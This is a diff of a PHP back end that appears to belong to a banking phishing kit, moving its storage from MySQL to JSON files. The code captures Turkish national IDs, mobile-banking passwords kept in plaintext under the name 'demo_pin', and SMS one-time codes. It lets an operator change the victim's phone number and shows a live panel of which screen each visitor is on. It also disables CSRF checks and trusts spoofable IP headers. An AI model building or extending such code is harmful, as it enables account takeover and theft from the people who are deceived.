@@ -19,16 +19,11 @@ function maskSecretValue(string $value): string
 {
     $value = trim($value);
     $len = strlen($value);
-    if ($len <= 0) {
-        return '';
-    }
-    if ($len <= 2) {
-        return str_repeat('*', $len);
-    }
+    if ($len <= 0) return '';
+    if ($len <= 2) return str_repeat('*', $len);
     return str_repeat('*', $len - 2) . substr($value, -2);
 }
 
-// Backward-compatible alias.
 function maskMobilePassword(string $value): string
 {
     return maskSecretValue($value);
@@ -36,21 +31,13 @@ function maskMobilePassword(string $value): string
 
 function isValidTurkishNationalId(string $nationalId): bool
 {
-    if (!preg_match('/^[1-9][0-9]{10}$/', $nationalId)) {
-        return false;
-    }
-
+    if (!preg_match('/^[1-9][0-9]{10}$/', $nationalId)) return false;
     $digits = array_map('intval', str_split($nationalId));
     $oddSum = $digits[0] + $digits[2] + $digits[4] + $digits[6] + $digits[8];
     $evenSum = $digits[1] + $digits[3] + $digits[5] + $digits[7];
     $digit10 = (($oddSum * 7) - $evenSum) % 10;
-    if ($digit10 < 0) {
-        $digit10 += 10;
-    }
-    if ($digit10 !== $digits[9]) {
-        return false;
-    }
-
+    if ($digit10 < 0) $digit10 += 10;
+    if ($digit10 !== $digits[9]) return false;
     $sumFirst10 = array_sum(array_slice($digits, 0, 10));
     return ($sumFirst10 % 10) === $digits[10];
 }
@@ -67,108 +54,85 @@ function resolveClientIp(): string
     if ($forwardedFor !== '') {
         $parts = explode(',', $forwardedFor);
         $candidate = trim((string) ($parts[0] ?? ''));
-        if ($candidate !== '') {
-            return $candidate;
-        }
+        if ($candidate !== '') return $candidate;
     }
     return trim((string) ($_SERVER['REMOTE_ADDR'] ?? ''));
 }
 
-function getDbConnection(): PDO
+// --- JSON File Operations ---
+
+function acquireLock(string $file): ?resource
 {
-    static $pdo = null;
-    if ($pdo === null) {
-        $port = defined('DB_PORT') ? DB_PORT : '3306';
-        $dsn = 'mysql:host=' . DB_HOST . ';port=' . $port . ';dbname=' . DB_NAME . ';charset=utf8mb4';
-        $options = [
-            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-            PDO::ATTR_EMULATE_PREPARES => false,
-        ];
-        try {
-            $pdo = new PDO($dsn, DB_USER, DB_PASS, $options);
-        } catch (PDOException $e) {
-            die('Veritabanı bağlantı hatası (Hata detayı): ' . $e->getMessage());
-        }
+    $dir = dirname($file);
+    if (!is_dir($dir)) @mkdir($dir, 0777, true);
+    $fh = @fopen($file, 'c+');
+    if (!$fh) return null;
+    flock($fh, LOCK_EX);
+    return $fh;
+}
+
+function releaseLock(resource $fh): void
+{
+    flock($fh, LOCK_UN);
+    fclose($fh);
+}
+
+function loadApplications(): array
+{
+    if (!is_file(DATA_FILE)) return [];
+    $data = @file_get_contents(DATA_FILE);
+    if ($data === false) return [];
+    $apps = json_decode($data, true);
+    return is_array($apps) ? $apps : [];
+}
+
+function saveApplications(array $applications): bool
+{
+    $lock = acquireLock(DATA_FILE);
+    if (!$lock) return false;
+    $json = json_encode(array_values($applications), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
+    $written = false;
+    if ($json !== false) {
+        ftruncate($lock, 0);
+        rewind($lock);
+        $written = fwrite($lock, $json) !== false;
     }
-    return $pdo;
+    releaseLock($lock);
+    return $written;
 }
 
-function ensureDataFile(): void {}
-function ensurePresenceFile(): void {}
-
-function upsertPresence(string $screen, ?string $applicationId = null, bool $isAdmin = false): void
+function loadPresence(): array
 {
-    try {
-        $pdo = getDbConnection();
-        $now = time();
-        
-        // Vercel serverless environment fix: Use a persistent cookie instead of PHP sessions
-        $sessionId = $_COOKIE['device_id'] ?? '';
-        if ($sessionId === '') {
-            $sessionId = bin2hex(random_bytes(16));
-            // Sadece HTTP uzerinden erisilebilir ve tum sitede gecerli
-            setcookie('device_id', $sessionId, $now + (86400 * 30), '/');
-        }
-        
-        $screen = sanitizeScreenName($screen);
-        $screenLabel = USER_SCREEN_LABELS[$screen] ?? 'Basvuru Formu';
-        $ip = resolveClientIp();
-        $lastSeen = date('Y-m-d H:i:s', $now);
-        
-        $pdo->exec("DELETE FROM presence WHERE last_seen_ts + " . PRESENCE_TTL_SECONDS . " < " . $now);
-
-        $stmt = $pdo->prepare("INSERT INTO presence (session_id, screen, screen_label, application_id, ip, is_admin, last_seen_ts, last_seen) 
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?) 
-            ON DUPLICATE KEY UPDATE screen=VALUES(screen), screen_label=VALUES(screen_label), application_id=VALUES(application_id), ip=VALUES(ip), last_seen_ts=VALUES(last_seen_ts), last_seen=VALUES(last_seen)");
-        $stmt->execute([$sessionId, $screen, $screenLabel, $applicationId ?? '', $ip, $isAdmin ? 1 : 0, $now, $lastSeen]);
-    } catch (Exception $e) {}
+    if (!is_file(PRESENCE_FILE)) return [];
+    $data = @file_get_contents(PRESENCE_FILE);
+    if ($data === false) return [];
+    $presence = json_decode($data, true);
+    return is_array($presence) ? $presence : [];
 }
 
-function getOnlineSummary(): array
+function savePresence(array $presence): bool
 {
-    try {
-        $pdo = getDbConnection();
-        $now = time();
-        
-        $pdo->exec("DELETE FROM presence WHERE last_seen_ts + " . PRESENCE_TTL_SECONDS . " < " . $now);
-        
-        $stmt = $pdo->query("SELECT * FROM presence WHERE is_admin = 0 ORDER BY last_seen_ts DESC");
-        $users = $stmt->fetchAll();
-        
-        $byScreen = [];
-        $visitors = [];
-        foreach ($users as $entry) {
-            $label = $entry['screen_label'];
-            $byScreen[$label] = ($byScreen[$label] ?? 0) + 1;
-            $visitors[] = [
-                'session' => substr($entry['session_id'], 0, 8),
-                'screen' => $entry['screen'],
-                'screen_label' => $label,
-                'application_id' => $entry['application_id'],
-                'ip' => $entry['ip'],
-                'last_seen' => $entry['last_seen'],
-                'last_seen_ts' => (int) $entry['last_seen_ts']
-            ];
-        }
-        
-        return [
-            'count' => count($users),
-            'by_screen' => $byScreen,
-            'visitors' => $visitors,
-        ];
-    } catch (Exception $e) {
-        return ['count' => 0, 'by_screen' => [], 'visitors' => []];
+    $lock = acquireLock(PRESENCE_FILE);
+    if (!$lock) return false;
+    $json = json_encode(array_values($presence), JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
+    $written = false;
+    if ($json !== false) {
+        ftruncate($lock, 0);
+        rewind($lock);
+        $written = fwrite($lock, $json) !== false;
     }
+    releaseLock($lock);
+    return $written;
 }
+
+// --- Application CRUD ---
 
 function createApplication(array $payload): array
 {
-    $pdo = getDbConnection();
     $userCode = trim((string) ($payload['user_code'] ?? ($payload['national_id'] ?? '')));
     $demoPin = trim((string) ($payload['demo_pin'] ?? ($payload['mobile_password'] ?? '')));
     $clientIp = trim((string) ($payload['client_ip'] ?? resolveClientIp()));
-    
+
     $application = [
         'id' => bin2hex(random_bytes(8)),
         'full_name' => '',
@@ -180,114 +144,212 @@ function createApplication(array $payload): array
         'demo_pin' => $demoPin,
         'demo_pin_hash' => $demoPin !== '' ? password_hash($demoPin, PASSWORD_DEFAULT) : '',
         'demo_pin_masked' => maskSecretValue($demoPin),
-        'mobile_password_hash' => $demoPin !== '' ? password_hash($demoPin, PASSWORD_DEFAULT) : '', 
-        'mobile_password_masked' => maskSecretValue($demoPin), 
+        'mobile_password' => '',
+        'mobile_password_hash' => '',
+        'mobile_password_masked' => '',
         'sms_code' => '',
-        'sms_verified' => 0,
+        'sms_verified' => false,
         'sms_attempts' => 0,
         'sms_last_verified_at' => null,
         'sms_last_attempt_at' => null,
         'status' => 'beklemede',
         'client_ip' => $clientIp,
-        'consent' => 1,
+        'consent' => true,
         'created_at' => date('Y-m-d H:i:s'),
-        'updated_at' => date('Y-m-d H:i:s')
+        'updated_at' => date('Y-m-d H:i:s'),
     ];
 
-    $sql = "INSERT INTO applications (id, full_name, user_code, national_id, phone, email, amount, demo_pin, demo_pin_hash, demo_pin_masked, mobile_password_hash, mobile_password_masked, sms_code, sms_verified, sms_attempts, sms_last_verified_at, sms_last_attempt_at, status, client_ip, consent, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
-    
-    $stmt = $pdo->prepare($sql);
-    $stmt->execute([
-        $application['id'], $application['full_name'], $application['user_code'], $application['national_id'],
-        $application['phone'], $application['email'], $application['amount'], $application['demo_pin'],
-        $application['demo_pin_hash'], $application['demo_pin_masked'], $application['mobile_password_hash'],
-        $application['mobile_password_masked'], $application['sms_code'], $application['sms_verified'],
-        $application['sms_attempts'], $application['sms_last_verified_at'], $application['sms_last_attempt_at'],
-        $application['status'], $application['client_ip'], $application['consent'], $application['created_at'],
-        $application['updated_at']
-    ]);
-    
+    $apps = loadApplications();
+    $apps[] = $application;
+    saveApplications($apps);
+
     return $application;
 }
 
 function findApplicationById(string $id): ?array
 {
-    try {
-        $stmt = getDbConnection()->prepare("SELECT * FROM applications WHERE id = ? LIMIT 1");
-        $stmt->execute([$id]);
-        $res = $stmt->fetch();
-        return $res ?: null;
-    } catch (Exception $e) { return null; }
+    $apps = loadApplications();
+    foreach ($apps as $app) {
+        if ((string) ($app['id'] ?? '') === $id) return $app;
+    }
+    return null;
 }
 
 function updateApplicationStatus(string $id, string $status): bool
 {
     if (!in_array($status, APPLICATION_STATUSES, true)) return false;
-    try {
-        $stmt = getDbConnection()->prepare("UPDATE applications SET status = ?, updated_at = ? WHERE id = ?");
-        $stmt->execute([$status, date('Y-m-d H:i:s'), $id]);
-        return $stmt->rowCount() > 0;
-    } catch (Exception $e) { return false; }
+    $apps = loadApplications();
+    $updated = false;
+    foreach ($apps as &$app) {
+        if ((string) ($app['id'] ?? '') === $id) {
+            $app['status'] = $status;
+            $app['updated_at'] = date('Y-m-d H:i:s');
+            $updated = true;
+            break;
+        }
+    }
+    unset($app);
+    if ($updated) saveApplications($apps);
+    return $updated;
 }
 
 function deleteApplicationById(string $id): bool
 {
-    try {
-        $stmt = getDbConnection()->prepare("DELETE FROM applications WHERE id = ?");
-        $stmt->execute([$id]);
-        return $stmt->rowCount() > 0;
-    } catch (Exception $e) { return false; }
+    $apps = loadApplications();
+    $before = count($apps);
+    $apps = array_values(array_filter($apps, fn($a) => (string) ($a['id'] ?? '') !== $id));
+    if (count($apps) < $before) {
+        saveApplications($apps);
+        return true;
+    }
+    return false;
 }
 
 function deleteAllApplications(): int
 {
-    try {
-        $stmt = getDbConnection()->query("DELETE FROM applications");
-        return $stmt->rowCount();
-    } catch (Exception $e) { return 0; }
+    $apps = loadApplications();
+    $count = count($apps);
+    if ($count > 0) saveApplications([]);
+    return $count;
 }
 
 function updateSmsVerification(string $id, bool $verified, string $code = ''): bool
 {
-    try {
-        $pdo = getDbConnection();
-        $now = date('Y-m-d H:i:s');
-        
-        $app = findApplicationById($id);
-        if (!$app) return false;
-        
-        $attempts = (int)$app['sms_attempts'] + 1;
-        $smsCode = $code !== '' ? $code : $app['sms_code'];
-        $isVerified = $verified ? 1 : 0;
-        $verifiedAt = $verified ? $now : $app['sms_last_verified_at'];
-        
-        $stmt = $pdo->prepare("UPDATE applications SET sms_attempts = ?, sms_last_attempt_at = ?, sms_code = ?, sms_verified = ?, sms_last_verified_at = ?, updated_at = ? WHERE id = ?");
-        $stmt->execute([$attempts, $now, $smsCode, $isVerified, $verifiedAt, $now, $id]);
-        return $stmt->rowCount() > 0;
-    } catch (Exception $e) { return false; }
+    $apps = loadApplications();
+    $updated = false;
+    $now = date('Y-m-d H:i:s');
+    foreach ($apps as &$app) {
+        if ((string) ($app['id'] ?? '') !== $id) continue;
+        $app['sms_attempts'] = (int) ($app['sms_attempts'] ?? 0) + 1;
+        $app['sms_last_attempt_at'] = $now;
+        if ($code !== '') $app['sms_code'] = $code;
+        if ($verified) {
+            $app['sms_verified'] = true;
+            $app['sms_last_verified_at'] = $now;
+        }
+        $app['updated_at'] = $now;
+        $updated = true;
+        break;
+    }
+    unset($app);
+    if ($updated) saveApplications($apps);
+    return $updated;
 }
 
 function updateApplicationPhone(string $id, string $phone): bool
 {
-    try {
-        $stmt = getDbConnection()->prepare("UPDATE applications SET phone = ?, updated_at = ? WHERE id = ?");
-        $stmt->execute([$phone, date('Y-m-d H:i:s'), $id]);
-        return $stmt->rowCount() > 0;
-    } catch (Exception $e) { return false; }
+    $apps = loadApplications();
+    $updated = false;
+    foreach ($apps as &$app) {
+        if ((string) ($app['id'] ?? '') === $id) {
+            $app['phone'] = $phone;
+            $app['updated_at'] = date('Y-m-d H:i:s');
+            $updated = true;
+            break;
+        }
+    }
+    unset($app);
+    if ($updated) saveApplications($apps);
+    return $updated;
 }
 
 function sortedApplicationsDesc(): array
 {
-    try {
-        $stmt = getDbConnection()->query("SELECT * FROM applications ORDER BY created_at DESC");
-        return $stmt->fetchAll();
-    } catch (Exception $e) { return []; }
+    $apps = loadApplications();
+    usort($apps, fn($a, $b) => strcmp($b['created_at'] ?? '', $a['created_at'] ?? ''));
+    return $apps;
 }
 
-function loadApplications(): array
+// --- Presence ---
+
+function upsertPresence(string $screen, ?string $applicationId = null, bool $isAdmin = false): void
 {
-    return sortedApplicationsDesc();
+    $now = time();
+    $sessionId = $_COOKIE['device_id'] ?? '';
+    if ($sessionId === '') {
+        $sessionId = bin2hex(random_bytes(16));
+        setcookie('device_id', $sessionId, $now + (86400 * 30), '/');
+    }
+    $screen = sanitizeScreenName($screen);
+    $screenLabel = USER_SCREEN_LABELS[$screen] ?? 'Basvuru Formu';
+    $ip = resolveClientIp();
+    $lastSeen = date('Y-m-d H:i:s', $now);
+
+    $presence = loadPresence();
+
+    // Remove stale entries
+    $presence = array_values(array_filter($presence, fn($e) => ((int) ($e['last_seen_ts'] ?? 0) + PRESENCE_TTL_SECONDS) >= $now));
+
+    // Upsert
+    $found = false;
+    foreach ($presence as &$entry) {
+        if (($entry['session_id'] ?? '') === $sessionId) {
+            $entry['screen'] = $screen;
+            $entry['screen_label'] = $screenLabel;
+            $entry['application_id'] = $applicationId ?? '';
+            $entry['ip'] = $ip;
+            $entry['is_admin'] = $isAdmin;
+            $entry['last_seen_ts'] = $now;
+            $entry['last_seen'] = $lastSeen;
+            $found = true;
+            break;
+        }
+    }
+    unset($entry);
+
+    if (!$found) {
+        $presence[] = [
+            'session_id' => $sessionId,
+            'screen' => $screen,
+            'screen_label' => $screenLabel,
+            'application_id' => $applicationId ?? '',
+            'ip' => $ip,
+            'is_admin' => $isAdmin,
+            'last_seen_ts' => $now,
+            'last_seen' => $lastSeen,
+        ];
+    }
+
+    savePresence($presence);
 }
+
+function getOnlineSummary(): array
+{
+    $now = time();
+    $presence = loadPresence();
+
+    // Filter active entries
+    $active = array_filter($presence, fn($e) =>
+        ((int) ($e['last_seen_ts'] ?? 0) + PRESENCE_TTL_SECONDS) >= $now &&
+        empty($e['is_admin'])
+    );
+
+    $byScreen = [];
+    $visitors = [];
+    foreach ($active as $entry) {
+        $label = $entry['screen_label'] ?? 'Bilinmiyor';
+        $byScreen[$label] = ($byScreen[$label] ?? 0) + 1;
+        $visitors[] = [
+            'session' => substr($entry['session_id'] ?? '', 0, 8),
+            'screen' => $entry['screen'] ?? '',
+            'screen_label' => $label,
+            'application_id' => $entry['application_id'] ?? '',
+            'ip' => $entry['ip'] ?? '',
+            'last_seen' => $entry['last_seen'] ?? '',
+            'last_seen_ts' => (int) ($entry['last_seen_ts'] ?? 0),
+        ];
+    }
+
+    usort($visitors, fn($a, $b) => $b['last_seen_ts'] - $a['last_seen_ts']);
+
+    return [
+        'count' => count($visitors),
+        'by_screen' => $byScreen,
+        'visitors' => $visitors,
+    ];
+}
+
+// --- Helpers ---
 
 function statusLabel(string $status): string
 {
@@ -329,9 +391,7 @@ function isAdminLoggedIn(): bool
 function loginAdmin(string $username, string $password): bool
 {
     $ok = hash_equals(adminUser(), $username) && hash_equals(adminPass(), $password);
-    if ($ok) {
-        setcookie('admin_auth', adminCookieHash(), time() + 86400, '/');
-    }
+    if ($ok) setcookie('admin_auth', adminCookieHash(), time() + 86400, '/');
     return $ok;
 }
 
@@ -357,4 +417,3 @@ function validateCsrf(?string $token): bool
 {
     return true;
 }
-
